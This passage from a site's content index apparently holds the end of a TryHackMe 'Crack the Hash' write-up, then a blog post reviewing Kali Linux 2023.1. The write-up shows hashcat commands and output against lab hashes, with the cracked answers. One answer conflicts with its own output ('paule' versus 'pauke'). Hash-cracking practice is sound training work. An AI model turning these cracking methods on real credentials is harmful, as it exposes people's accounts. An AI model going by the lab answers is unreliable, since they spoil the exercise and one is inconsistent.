./hashcat64.bin -m 1400 hash.txt ../rockyou.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule Session..........: hashcat Status...........: Cracked Hash.Type........: SHA2-256 Hash.Target......: f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f...2d0c85 Time.Started.....: Thu Sep 5 16:44:44 2019 (1 sec) Time.Estimated...: Thu Sep 5 16:44:45 2019 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 12297.6 kH/s (3.26ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 196608/14344385 (1.37%) Rejected.........: 0/196608 (0.00%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 123456 -\u0026gt; piggy9 Hardware.Mon.#1..: Temp: 60c Util: 0% Core:1189MHz Mem:2505MHz Bus:4 Started: Thu Sep 5 16:44:42 2019 Stopped: Thu Sep 5 16:44:46 2019 f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule\nCrackstation Answer: pauke\ntask 7 - NTLM Hash: 1DFECA0C002AE40B8619ECF94819CC1B\nthis time it is a NTLM hash we can find it in crackstation\nAnswer: n63umy8lkf4i\ntask 8 - sha512 (salted) hash: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02\nSalt: aReallyHardSalt\n$6$ is a sha512crypt\nit is a salted sha512 hash we can use hashcat to crack it\nasad@kali:~/tools$ ./hashcat/hashcat64.bin -m 1800 sha512.hash rockyou.txt --session sha512 hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt * Uses-64-Bit Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s Session..........: sha512 Status...........: Running Hash.Type........: sha512crypt $6$, SHA512 (Unix) Hash.Target......: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPM...ZAs02. Time.Started.....: Thu Sep 5 18:23:56 2019 (10 mins, 59 secs) Time.Estimated...: Thu Sep 5 19:27:46 2019 (52 mins, 51 secs) Guess.Base.......: File (rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 3746 H/s (18.22ms) @ Accel:64 Loops:32 Thr:32 Vec:1 Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts Progress.........: 2463744/14344385 (17.18%) Rejected.........: 0/2463744 (0.00%) Restore.Point....: 2463744/14344385 (17.18%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:2784-2816 Candidates.#2....: จคภจจ/ภ-ึจ -\u0026gt; zz336649 Hardware.Mon.#2..: Temp: 86c Util: 93% Core:1137MHz Mem:2505MHz Bus:4 Answer: waka99\ntask 9 - sha1(salted) hash: e5d8870e5bdd26602cab8dbe07a942c8669e56d6\nSalt: tryhackme\ncan be solved using hashcat using mode -m 110\nasad@kali:~/tools/hashcat$ ./hashcat64.bin -m 110 ../hash.sha1 ../rockyou.txt Answer: 481616481616\nConclusion In conclusion, hash cracking is a process of attempting to recover passwords from hashed data using specialized software tools like Hashcat. It is a useful technique for security professionals to assess the strength of passwords and improve overall security measures. If you found this write-up helpful, please consider sharing it with others who may also benefit from learning about hash cracking.\n","permalink":"https://iasad.me/write-ups/tryhackme/crack-the-hash.md/","summary":"analyzing and cracking hashes using hashcat and different online tools such as crackstation","title":"Crack the Hash - TryHackMe"},{"content":"Offensive Security just launched Kali Linux 2023.1, the latest version of their popular hacking tool. to celebrate their 10th anniversary. Exciting news for the cybersecurity world! They\u0026rsquo;ve even added a special edition called Kali Purple, specifically designed for those on the defense side of cybersecurity. This version is perfect for Blue and Purple team members who want to strengthen their security strategies.\nKali Linux is a go-to choice for ethical hackers and security experts who want to test network systems for vulnerabilities and conduct cybersecurity research. With Python updates and other new features, this latest release promises to make cybersecurity even more accessible and effective.\nKali Purple - The dawn of a new era. Kali is not only Offense, but starting to be defense Python Changes - Python 3.11 \u0026amp; PIP changes going forward 2023 Theme - Our once a year theme update! This time, what’s old is new again Desktop Updates - Xfce 4.18 \u0026amp; KDE Plasma 5.27 Default Kernel Settings - What makes the Kali kernel different New Tools - As always, various new tools added Kali Purple at Kali Linux 2023.1 Kali Purple is a new addition to Kali Linux 2023.1, designed for defensive security. It is specifically aimed at Blue and Purple team members, providing a comprehensive suite of tools for security professionals specializing in penetration testing and ethical hacking.\nWhat is in Kali Purple? Kali Purple is a reference architecture for the ultimate SOC In-A-Box It is perfect for learning, practicing SOC analysis and threat hunting, security control design and testing, Blue/Red/Purple teaming exercises, Kali spy vs. spy competitions, and protecting small to medium-sized environments It has over 100 defensive tools, including Arkime, CyberChef, Elastic Security, GVM, TheHive, Malcolm, Suricata, Zeek, and all the usual Kali tools It also has defensive tool documentation, a pre-generated image, and Kali Autopilot, an attack script builder/framework for automated attacks Kali Purple Hub is available for the community to share practice pcaps, Kali Autopilot scripts for blue teaming exercises, and community Wiki It has a defensive menu structure according to NIST CSF Identify Protect Detect Respond Recover Kali Purple Discord channels for community collaboration and fun It has a unique theme with installer, menu entries, and Xfce. Python Updates \u0026amp; Changes Debian is getting ready to release its next stable version, which means packages are being updated. Python is one such package, with Python 3.11 now available in Debian. This new version brings more informative error tracebacks and a significant speed increase. However, some older packages may not be supported with the upgrade.\nOne change that may catch people off guard is Python\u0026rsquo;s PIP behavior. Using PIP to install Python modules can clash with the operating system\u0026rsquo;s package management system, apt. To avoid this issue, users have three options:\nUse apt install python3-\u0026lt;package\u0026gt; (easy, simple \u0026amp; recommended) Use venv (slightly more complicated but still recommended) Use -break-system-packages (warning warning warning!) Kali Linux has applied a temporary patch to give users more time to adjust their procedures. However, this patch will be dropped with the release of Kali 2023.4 in the fourth quarter of this year. After that, PIP will refuse to install packages system-wide, and users will need to use one of the recommended options mentioned earlier. Kali Linux will remind users of this change with each version building up to the release. It is important to update scripts, pipelines, and documentation to the recommended ways to avoid issues with the new Python update.\nTheme Refresh Kali Linux 2023.1 has a brand new theme with updated wallpapers for the desktop, login, and boot displays. The Kali purple flavor is also included, and all desktops are now supported with new purple themes and icons. This year, in celebration of the 10-year anniversary, the theme is inspired by previous iconic Kali releases.\nthe backgrounds pays tribute to previous iconic Kali releases:\nBoot - Kali 1.0 Login/Lock - Kali 2.0 Wallpaper - Kali 1.1 Check out the latest Kali screenshot alongside the reference images below.\nBoot menu: Login/Lock:\nDesktop:\nAll new wallpapers New Tools in Kali It would not be a Kali release if there were not any new tools added! A quick run down of what has been added (to the network repositories):\nArkime CyberChef DefectDojo Dscan Kubernetes-Helm PACK2 Redeye Unicrypto There have also been numerous packages updates and new libraries as well. We also bump the Kali kernel to 6.1!\nDownload Kali Linux 2023.1 Kali Linux 2023.1 can be downloaded or you can update your existing installation to this version.\nMy Thoughts Kali Linux 2023.1 has made a great impression on me! What I really like is Kali Purple, a special edition designed for defensive security. Kali Purple comes with more than 100 tools that are perfect for practicing SOC analysis and threat hunting, as well as other things. This release also has some updates to Python and other elements that make it even better. The new theme is a nice touch and pays tribute to previous Kali versions that are well-known. Overall, I\u0026rsquo;m extremely happy with Kali Linux 2023.1\n","permalink":"https://iasad.me/blogs/kali-linux-2023-1/","summary":"A comprehensive overview of the latest version of Kali, covering its features, enhancements, and upgrades, to provide you with all the necessary knowledge about this version.","title":"Kali Linux 2023.1 - The Ultimate Platform for Offensive and Defensive Security"}]